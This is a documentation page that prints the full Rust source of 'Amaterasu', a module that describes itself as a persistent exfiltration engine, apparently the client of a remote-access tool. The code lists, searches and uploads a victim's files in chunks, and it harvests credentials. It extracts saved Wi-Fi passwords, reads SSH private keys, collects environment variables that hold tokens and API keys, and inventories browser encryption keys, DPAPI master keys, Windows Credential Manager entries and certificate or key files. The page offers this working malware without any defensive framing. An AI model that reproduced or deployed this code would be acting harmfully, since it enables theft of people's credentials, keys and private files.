# Amaterasu (天照) — Persistent exfiltration engine (client side).

| Field | Value |
|-------|-------|
| **Source** | `src/client_rust/src/amaterasu.rs` |
| **Lines** | 1107 |
| **Cards** | T023-client-capabilities |
| **Role** | Exfiltration engine |

## Purpose

Amaterasu (天照) — Persistent exfiltration engine (client side).

Handles: filesystem browsing, chunked file upload, credential harvesting.

Message types (client → server):
0x20 MSG_AMATERASU_CHUNK:   [4B job_id BE][4B offset BE][chunk_data]
0x21 MSG_AMATERASU_HARVEST: JSON {job_id, harvest_type, data}
0x22 MSG_AMATERASU_LS:      JSON {request_id, path, entries: [{name,size,is_dir,modified}]}
0x23 MSG_AMATERASU_ERROR:   JSON {job_id, error}

## Constants

- `MSG_AMATERASU_CHUNK`: `u8` = `0x20`
- `MSG_AMATERASU_HARVEST`: `u8` = `0x21`
- `MSG_AMATERASU_LS`: `u8` = `0x22`
- `MSG_AMATERASU_ERROR`: `u8` = `0x23`
- `DEFAULT_CHUNK_SIZE`: `u32` = `65536` — 64 KB
- `MAX_SEARCH_RESULTS`: `usize` = `1000`

## Types

### struct `DownloadRequest` (line 56)

### struct `HarvestRequest` (line 71)

### struct `LsRequest` (line 77)

### struct `SearchRequest` (line 83)

### struct `CancelRequest` (line 96)

### struct `FileEntry` (line 101)

## Public API

### `cancel` (line 36)
```rust
pub fn cancel(job_id: u32)
```

### `is_cancelled` (line 42)
```rust
pub fn is_cancelled(job_id: u32) -> bool
```

### `clear` (line 46)
```rust
pub fn clear(job_id: u32)
```

## Internal Functions

- `get` (line 32)
- `default_chunk_size` (line 66)
- `default_max_depth` (line 91)
- `build_message` (line 110)
- `build_error` (line 118)
- `format_system_time` (line 126)
- `walk_dir_search` (line 434)
- `glob_match` — Simple glob matching supporting `*` (any chars) and `?` (single char). (line 487)
- `glob_match_inner` (line 496)
- `harvest_all` (line 537)
- `harvest_wifi` (line 551)
- `harvest_wifi` (line 636)
- `harvest_ssh` (line 642)
- `harvest_env` (line 690)
- `harvest_dpapi` (line 719)
- `appdata_or_empty` (line 837)
- `harvest_dpapi` (line 842)
- `harvest_vault` (line 849)
- `harvest_vault` (line 915)
- `harvest_certs` (line 921)
- `scan_certs_in_dir` (line 977)
- `home_dir` (line 1028)

## Key Dependencies

- `use serde::{Deserialize, Serialize};`
- `use tracing::{debug, error, info, warn};`

## Full Source

```rust
//! Amaterasu (天照) — Persistent exfiltration engine (client side).
//!
//! Handles: filesystem browsing, chunked file upload, credential harvesting.
//!
//! Message types (client → server):
//!   0x20 MSG_AMATERASU_CHUNK:   [4B job_id BE][4B offset BE][chunk_data]
//!   0x21 MSG_AMATERASU_HARVEST: JSON {job_id, harvest_type, data}
//!   0x22 MSG_AMATERASU_LS:      JSON {request_id, path, entries: [{name,size,is_dir,modified}]}
//!   0x23 MSG_AMATERASU_ERROR:   JSON {job_id, error}

use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use tracing::{debug, error, info, warn};

// --- Protocol constants ---

pub const MSG_AMATERASU_CHUNK: u8 = 0x20;
pub const MSG_AMATERASU_HARVEST: u8 = 0x21;
pub const MSG_AMATERASU_LS: u8 = 0x22;
pub const MSG_AMATERASU_ERROR: u8 = 0x23;

const DEFAULT_CHUNK_SIZE: u32 = 65536; // 64 KB
const MAX_SEARCH_RESULTS: usize = 1000;

// --- Cancellation registry (OnceLock-based, no external deps) ---
mod cancel_registry {
    use std::collections::HashSet;
    use std::sync::{Mutex, OnceLock};

    static CANCELLED: OnceLock<Mutex<HashSet<u32>>> = OnceLock::new();

    fn get() -> &'static Mutex<HashSet<u32>> {
        CANCELLED.get_or_init(|| Mutex::new(HashSet::new()))
    }

    pub fn cancel(job_id: u32) {
        if let Ok(mut set) = get().lock() {
            set.insert(job_id);
        }
    }

    pub fn is_cancelled(job_id: u32) -> bool {
        get().lock().map(|set| set.contains(&job_id)).unwrap_or(false)
    }

    pub fn clear(job_id: u32) {
        if let Ok(mut set) = get().lock() {
            set.remove(&job_id);
        }
    }
}

// --- Request / Response structs ---

#[derive(Debug, Deserialize)]
pub struct DownloadRequest {
    pub job_id: u32,
    #[serde(alias = "path")]
    pub remote_path: String,
    #[serde(default)]
    pub offset: u64,
    #[serde(default = "default_chunk_size")]
    pub chunk_size: u32,
}

fn default_chunk_size() -> u32 {
    DEFAULT_CHUNK_SIZE
}

#[derive(Debug, Deserialize)]
pub struct HarvestRequest {
    pub job_id: u32,
    pub harvest_type: String,
}

#[derive(Debug, Deserialize)]
pub struct LsRequest {
    pub request_id: String,
    pub path: String,
}

#[derive(Debug, Deserialize)]
pub struct SearchRequest {
    pub request_id: String,
    pub path: String,
    pub pattern: String,
    #[serde(default = "default_max_depth")]
    pub max_depth: u32,
}

fn default_max_depth() -> u32 {
    10
}

#[derive(Debug, Deserialize)]
pub struct CancelRequest {
    pub job_id: u32,
}

#[derive(Debug, Serialize)]
pub struct FileEntry {
    pub name: String,
    pub size: u64,
    pub is_dir: bool,
    pub modified: String,
}

// --- Message builder ---

fn build_message(msg_type: u8, payload: &[u8]) -> Vec<u8> {
    let mut msg = Vec::with_capacity(5 + payload.len());
    msg.push(msg_type);
    msg.extend_from_slice(&(payload.len() as u32).to_be_bytes());
    msg.extend_from_slice(payload);
    msg
}

fn build_error(job_id: u32, error: &str) -> Vec<u8> {
    let json = serde_json::json!({
        "job_id": job_id,
        "error": error,
    });
    build_message(MSG_AMATERASU_ERROR, json.to_string().as_bytes())
}

fn format_system_time(time: std::time::SystemTime) -> String {
    match time.duration_since(std::time::UNIX_EPOCH) {
        Ok(dur) => {
            let secs = dur.as_secs();
            // Simple ISO-ish timestamp without pulling in chrono
            let days = secs / 86400;
            let remaining = secs % 86400;
            let hours = remaining / 3600;
            let minutes = (remaining % 3600) / 60;
            let seconds = remaining % 60;

            // Rough date calculation (good enough for file metadata)
            let mut y = 1970i64;
            let mut d = days as i64;
            loop {
                let days_in_year = if y % 4 == 0 && (y % 100 != 0 || y % 400 == 0) {
                    366
                } else {
                    365
                };
                if d < days_in_year {
                    break;
                }
                d -= days_in_year;
                y += 1;
            }
            let leap = y % 4 == 0 && (y % 100 != 0 || y % 400 == 0);
            let mdays: [i64; 12] = [
                31,
                if leap { 29 } else { 28 },
                31, 30, 31, 30, 31, 31, 30, 31, 30, 31,
            ];
            let mut m = 0usize;
            for (i, &md) in mdays.iter().enumerate() {
                if d < md {
                    m = i;
                    break;
                }
                d -= md;
            }
            format!(
                "{:04}-{:02}-{:02}T{:02}:{:02}:{:02}Z",
                y,
                m + 1,
                d + 1,
                hours,
                minutes,
                seconds,
            )
        }
        Err(_) => "1970-01-01T00:00:00Z".to_string(),
    }
}

// --- LS handler ---

pub async fn handle_ls(req: LsRequest) -> Vec<u8> {
    info!("Amaterasu LS: {}", req.path);

    let path = PathBuf::from(&req.path);
    let entries = match tokio::fs::read_dir(&path).await {
        Ok(mut dir) => {
            let mut results = Vec::new();
            while let Ok(Some(entry)) = dir.next_entry().await {
                let name = entry.file_name().to_string_lossy().to_string();
                let meta = entry.metadata().await;
                let (size, is_dir, modified) = match meta {
                    Ok(m) => (
                        m.len(),
                        m.is_dir(),
                        m.modified()
                            .map(|t| format_system_time(t))
                            .unwrap_or_else(|_| "unknown".to_string()),
                    ),
                    Err(_) => (0, false, "unknown".to_string()),
                };
                results.push(FileEntry {
                    name,
                    size,
                    is_dir,
                    modified,
                });
            }
            results
        }
        Err(e) => {
            warn!("Amaterasu LS error for {}: {}", req.path, e);
            let json = serde_json::json!({
                "request_id": req.request_id,
                "path": req.path,
                "entries": [],
                "error": e.to_string(),
            });
            return build_message(MSG_AMATERASU_LS, json.to_string().as_bytes());
        }
    };

    let json = serde_json::json!({
        "request_id": req.request_id,
        "path": req.path,
        "entries": entries,
    });
    build_message(MSG_AMATERASU_LS, json.to_string().as_bytes())
}

// --- Download handler ---

pub async fn handle_download(req: DownloadRequest) -> Vec<Vec<u8>> {
    info!(
        "Amaterasu DOWNLOAD: job_id={} path={} offset={} chunk_size={}",
        req.job_id, req.remote_path, req.offset, req.chunk_size
    );

    let chunk_size = if req.chunk_size == 0 {
        DEFAULT_CHUNK_SIZE
    } else {
        req.chunk_size
    };

    // Clear any prior cancellation for this job
    cancel_registry::clear(req.job_id);

    let file = match tokio::fs::File::open(&req.remote_path).await {
        Ok(f) => f,
        Err(e) => {
            error!("Amaterasu DOWNLOAD open error: {}", e);
            return vec![build_error(req.job_id, &format!("open failed: {}", e))];
        }
    };

    let metadata = match file.metadata().await {
        Ok(m) => m,
        Err(e) => {
            error!("Amaterasu DOWNLOAD metadata error: {}", e);
            return vec![build_error(req.job_id, &format!("metadata failed: {}", e))];
        }
    };

    let file_size = metadata.len();
    if req.offset >= file_size {
        // Nothing to read — offset is past end of file
        return vec![build_error(
            req.job_id,
            &format!(
                "offset {} beyond file size {}",
                req.offset, file_size
            ),
        )];
    }

    // Use std::fs for seek + read since tokio::fs::File seek requires &mut
    let path = req.remote_path.clone();
    let job_id = req.job_id;
    let offset = req.offset;

    let result = tokio::task::spawn_blocking(move || {
        use std::io::{Read, Seek, SeekFrom};

        let mut f = match std::fs::File::open(&path) {
            Ok(f) => f,
            Err(e) => {
                return vec![build_error(job_id, &format!("open failed: {}", e))];
            }
        };

        if offset > 0 {
            if let Err(e) = f.seek(SeekFrom::Start(offset)) {
                return vec![build_error(job_id, &format!("seek failed: {}", e))];
            }
        }

        let mut messages = Vec::new();
        let mut current_offset = offset;
        let mut buf = vec![0u8; chunk_size as usize];

        loop {
            // Check cancellation between chunks
            if cancel_registry::is_cancelled(job_id) {
                info!("Amaterasu DOWNLOAD job_id={} cancelled", job_id);
                messages.push(build_error(job_id, "cancelled"));
                break;
            }

            let bytes_read = match f.read(&mut buf) {
                Ok(0) => break, // EOF
                Ok(n) => n,
                Err(e) => {
                    error!("Amaterasu DOWNLOAD read error at offset {}: {}", current_offset, e);
                    messages.push(build_error(job_id, &format!("read error: {}", e)));
                    break;
                }
            };

            // Build MSG_AMATERASU_CHUNK: [4B job_id BE][4B offset BE][chunk_data]
            let mut payload = Vec::with_capacity(8 + bytes_read);
            payload.extend_from_slice(&job_id.to_be_bytes());
            payload.extend_from_slice(&(current_offset as u32).to_be_bytes());
            payload.extend_from_slice(&buf[..bytes_read]);

            messages.push(build_message(MSG_AMATERASU_CHUNK, &payload));
            current_offset += bytes_read as u64;
        }

        cancel_registry::clear(job_id);
        debug!(
            "Amaterasu DOWNLOAD job_id={}: {} chunks, {} bytes total",
            job_id,
            messages.len(),
            current_offset - offset
        );
        messages
    })
    .await;

    match result {
        Ok(msgs) => msgs,
        Err(e) => {
            error!("Amaterasu DOWNLOAD task error: {}", e);
            vec![build_error(req.job_id, &format!("task error: {}", e))]
        }
    }
}

// --- Harvest handler ---

pub async fn handle_harvest(req: HarvestRequest) -> Vec<u8> {
    info!(
        "Amaterasu HARVEST: job_id={} type={}",
        req.job_id, req.harvest_type
    );

    let job_id = req.job_id;
    let harvest_type = req.harvest_type.clone();

    let result = tokio::task::spawn_blocking(move || {
        let data = match harvest_type.as_str() {
            "wifi" => harvest_wifi(),
            "ssh" => harvest_ssh(),
            "env" => harvest_env(),
            "dpapi" => harvest_dpapi(),
            "vault" => harvest_vault(),
            "certs" => harvest_certs(),
            "all" => harvest_all(),
            other => {
                serde_json::json!({"error": format!("unknown harvest type: {}", other)})
            }
        };

        let json = serde_json::json!({
            "job_id": job_id,
            "harvest_type": harvest_type,
            "data": data,
        });
        build_message(MSG_AMATERASU_HARVEST, json.to_string().as_bytes())
    })
    .await;

    match result {
        Ok(msg) => msg,
        Err(e) => {
            error!("Amaterasu HARVEST task error: {}", e);
            build_error(req.job_id, &format!("harvest task error: {}", e))
        }
    }
}

// --- Search handler ---

pub async fn handle_search(req: SearchRequest) -> Vec<u8> {
    info!(
        "Amaterasu SEARCH: path={} pattern={} max_depth={}",
        req.path, req.pattern, req.max_depth
    );

    let path = req.path.clone();
    let pattern = req.pattern.clone();
    let max_depth = req.max_depth;
    let request_id = req.request_id.clone();

    let result = tokio::task::spawn_blocking(move || {
        let mut matches = Vec::new();
        walk_dir_search(
            &PathBuf::from(&path),
            &pattern,
            0,
            max_depth,
            &mut matches,
        );
        matches
    })
    .await;

    let entries = match result {
        Ok(entries) => entries,
        Err(e) => {
            warn!("Amaterasu SEARCH task error: {}", e);
            Vec::new()
        }
    };

    let json = serde_json::json!({
        "request_id": request_id,
        "path": req.path,
        "entries": entries,
    });
    build_message(MSG_AMATERASU_LS, json.to_string().as_bytes())
}

fn walk_dir_search(
    dir: &std::path::Path,
    pattern: &str,
    current_depth: u32,
    max_depth: u32,
    results: &mut Vec<FileEntry>,
) {
    if current_depth > max_depth || results.len() >= MAX_SEARCH_RESULTS {
        return;
    }

    let entries = match std::fs::read_dir(dir) {
        Ok(e) => e,
        Err(_) => return,
    };

    for entry in entries.flatten() {
        if results.len() >= MAX_SEARCH_RESULTS {
            return;
        }

        let name = entry.file_name().to_string_lossy().to_string();
        let meta = entry.metadata();
        let is_dir = meta.as_ref().map(|m| m.is_dir()).unwrap_or(false);

        // Glob-like matching: support * and ? wildcards
        if glob_match(pattern, &name) {
            let (size, modified) = match &meta {
                Ok(m) => (
                    m.len(),
                    m.modified()
                        .map(|t| format_system_time(t))
                        .unwrap_or_else(|_| "unknown".to_string()),
                ),
                Err(_) => (0, "unknown".to_string()),
            };
            results.push(FileEntry {
                name: entry.path().to_string_lossy().to_string(),
                size,
                is_dir,
                modified,
            });
        }

        // Recurse into subdirectories
        if is_dir {
            walk_dir_search(&entry.path(), pattern, current_depth + 1, max_depth, results);
        }
    }
}

/// Simple glob matching supporting `*` (any chars) and `?` (single char).
/// Case-insensitive on Windows, case-sensitive elsewhere.
fn glob_match(pattern: &str, name: &str) -> bool {
    #[cfg(windows)]
    let (pattern, name) = (pattern.to_lowercase(), name.to_lowercase());
    #[cfg(windows)]
    let (pattern, name) = (pattern.as_str(), name.as_str());

    glob_match_inner(pattern.as_bytes(), name.as_bytes())
}

fn glob_match_inner(pattern: &[u8], text: &[u8]) -> bool {
    let mut pi = 0;
    let mut ti = 0;
    let mut star_pi = usize::MAX;
    let mut star_ti = 0;

    while ti < text.len() {
        if pi < pattern.len() && (pattern[pi] == b'?' || pattern[pi] == text[ti]) {
            pi += 1;
            ti += 1;
        } else if pi < pattern.len() && pattern[pi] == b'*' {
            star_pi = pi;
            star_ti = ti;
            pi += 1;
        } else if star_pi != usize::MAX {
            pi = star_pi + 1;
            star_ti += 1;
            ti = star_ti;
        } else {
            return false;
        }
    }

    while pi < pattern.len() && pattern[pi] == b'*' {
        pi += 1;
    }

    pi == pattern.len()
}

// --- Cancel handler ---

pub async fn handle_cancel(req: CancelRequest) {
    info!("Amaterasu CANCEL: job_id={}", req.job_id);
    cancel_registry::cancel(req.job_id);
}

// ===================================================================
// Sub-harvesters
// ===================================================================

fn harvest_all() -> serde_json::Value {
    serde_json::json!({
        "wifi": harvest_wifi(),
        "ssh": harvest_ssh(),
        "env": harvest_env(),
        "dpapi": harvest_dpapi(),
        "vault": harvest_vault(),
        "certs": harvest_certs(),
    })
}

// --- WiFi harvester ---

#[cfg(target_os = "windows")]
fn harvest_wifi() -> serde_json::Value {
    let profiles_output = match std::process::Command::new("netsh")
        .args(["wlan", "show", "profiles"])
        .output()
    {
        Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
        Err(e) => {
            warn!("harvest_wifi: netsh failed: {}", e);
            return serde_json::json!({"error": e.to_string()});
        }
    };

    let mut results = Vec::new();

    for line in profiles_output.lines() {
        // Line format: "    All User Profile     : MyNetwork"
        let trimmed = line.trim();
        let prefix_en = "All User Profile     :";
        let prefix_es = "Todos los perfiles de usuario :";
        let prefix_pt = "Todos os perfis de usu";

        let ssid = if let Some(rest) = trimmed.strip_prefix(prefix_en) {
            rest.trim().to_string()
        } else if let Some(rest) = trimmed.strip_prefix(prefix_es) {
            rest.trim().to_string()
        } else if trimmed.contains(prefix_pt) {
            // Portuguese locale
            trimmed
                .split(':')
                .nth(1)
                .map(|s| s.trim().to_string())
                .unwrap_or_default()
        } else if trimmed.contains("Profile") && trimmed.contains(':') {
            // Generic fallback for other locales
            trimmed
                .split(':')
                .nth(1)
                .map(|s| s.trim().to_string())
                .unwrap_or_default()
        } else {
            continue;
        };

        if ssid.is_empty() {
            continue;
        }

        // Query key for this SSID
        let detail_output = match std::process::Command::new("netsh")
            .args(["wlan", "show", "profile", &format!("name={}", ssid), "key=clear"])
            .output()
        {
            Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
            Err(_) => continue,
        };

        let mut password = String::new();
        let mut auth_type = String::new();

        for detail_line in detail_output.lines() {
            let dt = detail_line.trim();
            // Key Content / Contenido de la clave / Conte
            if dt.contains("Key Content") || dt.contains("Contenido de la clave") || dt.contains("Conte") {
                if let Some(val) = dt.split(':').nth(1) {
                    password = val.trim().to_string();
                }
            }
            if dt.contains("Authentication") || dt.contains("Autenticaci") {
                if let Some(val) = dt.split(':').nth(1) {
                    auth_type = val.trim().to_string();
                }
            }
        }

        results.push(serde_json::json!({
            "ssid": ssid,
            "password": password,
            "auth_type": auth_type,
        }));
    }

    serde_json::json!(results)
}

#[cfg(not(target_os = "windows"))]
fn harvest_wifi() -> serde_json::Value {
    serde_json::json!({"error": "wifi harvest not supported on this platform"})
}

// --- SSH harvester ---

fn harvest_ssh() -> serde_json::Value {
    let home = match home_dir() {
        Some(h) => h,
        None => return serde_json::json!({"error": "cannot determine home directory"}),
    };

    let ssh_dir = home.join(".ssh");
    if !ssh_dir.exists() {
        return serde_json::json!({"error": ".ssh directory not found", "path": ssh_dir.to_string_lossy()});
    }

    let entries = match std::fs::read_dir(&ssh_dir) {
        Ok(e) => e,
        Err(e) => {
            return serde_json::json!({"error": format!("cannot read .ssh: {}", e)});
        }
    };

    let mut results = Vec::new();

    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_dir() {
            continue;
        }

        let size = entry.metadata().map(|m| m.len()).unwrap_or(0);

        // Read file contents (private keys, config, known_hosts)
        // Cap at 256KB to avoid reading huge files
        let content = if size <= 262144 {
            std::fs::read_to_string(&path).unwrap_or_else(|_| "(binary)".to_string())
        } else {
            format!("(too large: {} bytes)", size)
        };

        results.push(serde_json::json!({
            "path": path.to_string_lossy(),
            "content": content,
            "size": size,
        }));
    }

    serde_json::json!(results)
}

// --- Environment variables harvester ---

fn harvest_env() -> serde_json::Value {
    let interesting_patterns = [
        "TOKEN", "KEY", "SECRET", "PASSWORD", "API", "CREDENTIALS",
        "AUTH", "AWS", "AZURE", "GCP", "GITHUB", "GITLAB",
        "DOCKER", "NPM", "NUGET", "PRIVATE", "CERT", "JWT",
        "DATABASE", "DB_PASS", "REDIS", "MONGO", "MYSQL", "POSTGRES",
        "SMTP", "MAIL", "SENDGRID", "TWILIO", "STRIPE", "SLACK",
        "WEBHOOK", "OPENAI", "ANTHROPIC", "HUGGING",
    ];

    let mut found = serde_json::Map::new();

    for (key, value) in std::env::vars() {
        let upper = key.to_uppercase();
        let is_interesting = interesting_patterns
            .iter()
            .any(|pattern| upper.contains(pattern));

        if is_interesting {
            found.insert(key, serde_json::Value::String(value));
        }
    }

    serde_json::Value::Object(found)
}

// --- DPAPI harvester ---

#[cfg(target_os = "windows")]
fn harvest_dpapi() -> serde_json::Value {
    let mut results = serde_json::Map::new();

    // 1. Chrome Local State encrypted_key metadata
    if let Ok(local) = std::env::var("LOCALAPPDATA") {
        let browsers = [
            ("chrome", "Google/Chrome/User Data/Local State"),
            ("edge", "Microsoft/Edge/User Data/Local State"),
            ("brave", "BraveSoftware/Brave-Browser/User Data/Local State"),
            ("opera", "Opera Software/Opera Stable/Local State"),
        ];

        let mut browser_keys = Vec::new();
        for (name, rel_path) in &browsers {
            let state_path = PathBuf::from(&local).join(rel_path);
            if state_path.exists() {
                let size = std::fs::metadata(&state_path)
                    .map(|m| m.len())
                    .unwrap_or(0);
                let has_encrypted_key = std::fs::read_to_string(&state_path)
                    .map(|content| content.contains("encrypted_key"))
                    .unwrap_or(false);
                browser_keys.push(serde_json::json!({
                    "browser": name,
                    "path": state_path.to_string_lossy(),
                    "size": size,
                    "has_encrypted_key": has_encrypted_key,
                }));
            }
        }
        results.insert(
            "browser_local_state".to_string(),
            serde_json::json!(browser_keys),
        );

        // 2. RDP credential files
        let cred_dir = PathBuf::from(&local).join("Microsoft").join("Credentials");
        if cred_dir.exists() {
            let mut cred_files = Vec::new();
            if let Ok(entries) = std::fs::read_dir(&cred_dir) {
                for entry in entries.flatten() {
                    let p = entry.path();
                    if p.is_file() {
                        let size = entry.metadata().map(|m| m.len()).unwrap_or(0);
                        cred_files.push(serde_json::json!({
                            "path": p.to_string_lossy(),
                            "size": size,
                        }));
                    }
                }
            }
            results.insert(
                "credential_files".to_string(),
                serde_json::json!(cred_files),
            );
        }

        // 3. Also check roaming credentials
        if let Ok(appdata) = std::env::var("APPDATA") {
            let roaming_cred = PathBuf::from(&appdata).join("Microsoft").join("Credentials");
            if roaming_cred.exists() {
                let mut cred_files = Vec::new();
                if let Ok(entries) = std::fs::read_dir(&roaming_cred) {
                    for entry in entries.flatten() {
                        let p = entry.path();
                        if p.is_file() {
                            let size = entry.metadata().map(|m| m.len()).unwrap_or(0);
                            cred_files.push(serde_json::json!({
                                "path": p.to_string_lossy(),
                                "size": size,
                            }));
                        }
                    }
                }
                results.insert(
                    "roaming_credential_files".to_string(),
                    serde_json::json!(cred_files),
                );
            }
        }

        // 4. DPAPI master key directory listing (metadata only)
        let protect_dir = PathBuf::from(&appdata_or_empty())
            .join("Microsoft")
            .join("Protect");
        if protect_dir.exists() {
            let mut master_keys = Vec::new();
            if let Ok(entries) = std::fs::read_dir(&protect_dir) {
                for entry in entries.flatten() {
                    let p = entry.path();
                    if p.is_dir() {
                        // SID directories inside Protect
                        if let Ok(sub_entries) = std::fs::read_dir(&p) {
                            for sub in sub_entries.flatten() {
                                let sp = sub.path();
                                if sp.is_file() {
                                    let size = sub.metadata().map(|m| m.len()).unwrap_or(0);
                                    master_keys.push(serde_json::json!({
                                        "path": sp.to_string_lossy(),
                                        "size": size,
                                    }));
                                }
                            }
                        }
                    }
                }
            }
            results.insert(
                "dpapi_master_keys".to_string(),
                serde_json::json!(master_keys),
            );
        }
    }

    serde_json::Value::Object(results)
}

#[cfg(target_os = "windows")]
fn appdata_or_empty() -> String {
    std::env::var("APPDATA").unwrap_or_default()
}

#[cfg(not(target_os = "windows"))]
fn harvest_dpapi() -> serde_json::Value {
    serde_json::json!({"error": "dpapi harvest not supported on this platform"})
}

// --- Vault harvester (Windows Credential Manager) ---

#[cfg(target_os = "windows")]
fn harvest_vault() -> serde_json::Value {
    let output = match std::process::Command::new("cmdkey")
        .args(["/list"])
        .output()
    {
        Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
        Err(e) => {
            warn!("harvest_vault: cmdkey failed: {}", e);
            return serde_json::json!({"error": e.to_string()});
        }
    };

    let mut credentials = Vec::new();
    let mut current_target = String::new();
    let mut current_type = String::new();
    let mut current_user = String::new();

    for line in output.lines() {
        let trimmed = line.trim();

        if trimmed.starts_with("Target:") || trimmed.starts_with("Destino:") {
            // Flush previous entry
            if !current_target.is_empty() {
                credentials.push(serde_json::json!({
                    "target": current_target,
                    "type": current_type,
                    "user": current_user,
                }));
            }
            current_target = trimmed
                .split(':')
                .skip(1)
                .collect::<Vec<&str>>()
                .join(":")
                .trim()
                .to_string();
            current_type = String::new();
            current_user = String::new();
        } else if trimmed.starts_with("Type:") || trimmed.starts_with("Tipo:") {
            current_type = trimmed
                .split(':')
                .nth(1)
                .map(|s| s.trim().to_string())
                .unwrap_or_default();
        } else if trimmed.starts_with("User:") || trimmed.starts_with("Usuario:") {
            current_user = trimmed
                .split(':')
                .nth(1)
                .map(|s| s.trim().to_string())
                .unwrap_or_default();
        }
    }

    // Flush last entry
    if !current_target.is_empty() {
        credentials.push(serde_json::json!({
            "target": current_target,
            "type": current_type,
            "user": current_user,
        }));
    }

    serde_json::json!(credentials)
}

#[cfg(not(target_os = "windows"))]
fn harvest_vault() -> serde_json::Value {
    serde_json::json!({"error": "vault harvest not supported on this platform"})
}

// --- Certificate harvester ---

fn harvest_certs() -> serde_json::Value {
    let cert_extensions = ["pem", "pfx", "p12", "crt", "cer", "key", "jks", "keystore"];
    let mut results = Vec::new();

    // Directories to scan
    let mut scan_dirs: Vec<PathBuf> = Vec::new();

    // ~/.ssh (already covered by ssh harvester, but include cert files)
    if let Some(home) = home_dir() {
        scan_dirs.push(home.join(".ssh"));
        scan_dirs.push(home.join(".ssl"));
        scan_dirs.push(home.join(".tls"));
        scan_dirs.push(home.clone());
    }

    // Windows-specific paths
    #[cfg(target_os = "windows")]
    {
        if let Ok(appdata) = std::env::var("APPDATA") {
            scan_dirs.push(PathBuf::from(&appdata));
        }
        if let Ok(local) = std::env::var("LOCALAPPDATA") {
            scan_dirs.push(PathBuf::from(&local));
        }
        if let Ok(userprofile) = std::env::var("USERPROFILE") {
            scan_dirs.push(PathBuf::from(&userprofile).join(".aws"));
            scan_dirs.push(PathBuf::from(&userprofile).join(".azure"));
            scan_dirs.push(PathBuf::from(&userprofile).join(".kube"));
        }
    }

    // Unix-specific paths
    #[cfg(not(target_os = "windows"))]
    {
        if let Some(home) = home_dir() {
            scan_dirs.push(home.join(".aws"));
            scan_dirs.push(home.join(".azure"));
            scan_dirs.push(home.join(".kube"));
            scan_dirs.push(PathBuf::from("/etc/ssl/certs"));
            scan_dirs.push(PathBuf::from("/etc/ssl/private"));
        }
    }

    for dir in &scan_dirs {
        if !dir.exists() {
            continue;
        }
        scan_certs_in_dir(dir, &cert_extensions, &mut results, 0, 2);
        if results.len() >= MAX_SEARCH_RESULTS {
            break;
        }
    }

    serde_json::json!(results)
}

fn scan_certs_in_dir(
    dir: &std::path::Path,
    extensions: &[&str],
    results: &mut Vec<serde_json::Value>,
    depth: u32,
    max_depth: u32,
) {
    if depth > max_depth || results.len() >= MAX_SEARCH_RESULTS {
        return;
    }

    let entries = match std::fs::read_dir(dir) {
        Ok(e) => e,
        Err(_) => return,
    };

    for entry in entries.flatten() {
        if results.len() >= MAX_SEARCH_RESULTS {
            return;
        }

        let path = entry.path();
        let meta = entry.metadata();
        let is_dir = meta.as_ref().map(|m| m.is_dir()).unwrap_or(false);

        if is_dir {
            scan_certs_in_dir(&path, extensions, results, depth + 1, max_depth);
            continue;
        }

        let name = entry.file_name().to_string_lossy().to_lowercase();
        let has_cert_ext = extensions.iter().any(|ext| name.ends_with(ext));

        if has_cert_ext {
            let size = meta.map(|m| m.len()).unwrap_or(0);
            let cert_type = path
                .extension()
                .map(|e| e.to_string_lossy().to_string())
                .unwrap_or_else(|| "unknown".to_string());

            results.push(serde_json::json!({
                "path": path.to_string_lossy(),
                "type": cert_type,
                "size": size,
            }));
        }
    }
}

// --- Utility: home directory ---

fn home_dir() -> Option<PathBuf> {
    #[cfg(target_os = "windows")]
    {
        std::env::var("USERPROFILE")
            .ok()
            .map(PathBuf::from)
            .or_else(|| {
                let drive = std::env::var("HOMEDRIVE").ok()?;
                let path = std::env::var("HOMEPATH").ok()?;
                Some(PathBuf::from(format!("{}{}", drive, path)))
            })
    }
    #[cfg(not(target_os = "windows"))]
    {
        std::env::var("HOME").ok().map(PathBuf::from)
    }
}

// ===================================================================
// Dispatch: called from commands.rs to route AMATERASU_* commands
// ===================================================================

/// Parse and dispatch an Amaterasu command. Returns messages to send back.
/// This is called from the receive loop with the full JSON payload.
pub async fn dispatch(cmd_type: &str, payload: &str) -> Vec<Vec<u8>> {
    match cmd_type {
        "AMATERASU_LS" => {
            match serde_json::from_str::<LsRequest>(payload) {
                Ok(req) => vec![handle_ls(req).await],
                Err(e) => {
                    error!("Amaterasu LS parse error: {}", e);
                    vec![build_error(0, &format!("parse error: {}", e))]
                }
            }
        }
        "AMATERASU_DOWNLOAD" => {
            match serde_json::from_str::<DownloadRequest>(payload) {
                Ok(req) => handle_download(req).await,
                Err(e) => {
                    error!("Amaterasu DOWNLOAD parse error: {}", e);
                    vec![build_error(0, &format!("parse error: {}", e))]
                }
            }
        }
        "AMATERASU_HARVEST" => {
            match serde_json::from_str::<HarvestRequest>(payload) {
                Ok(req) => vec![handle_harvest(req).await],
                Err(e) => {
                    error!("Amaterasu HARVEST parse error: {}", e);
                    vec![build_error(0, &format!("parse error: {}", e))]
                }
            }
        }
        "AMATERASU_SEARCH" => {
            match serde_json::from_str::<SearchRequest>(payload) {
                Ok(req) => vec![handle_search(req).await],
                Err(e) => {
                    error!("Amaterasu SEARCH parse error: {}", e);
                    vec![build_error(0, &format!("parse error: {}", e))]
                }
            }
        }
        "AMATERASU_CANCEL" => {
            match serde_json::from_str::<CancelRequest>(payload) {
                Ok(req) => {
                    handle_cancel(req).await;
                    Vec::new() // No response message needed
                }
                Err(e) => {
                    error!("Amaterasu CANCEL parse error: {}", e);
                    vec![build_error(0, &format!("parse error: {}", e))]
                }
            }
        }
        _ => {
            warn!("Unknown Amaterasu command: {}", cmd_type);
            vec![build_error(0, &format!("unknown command: {}", cmd_type))]
        }
    }
}

```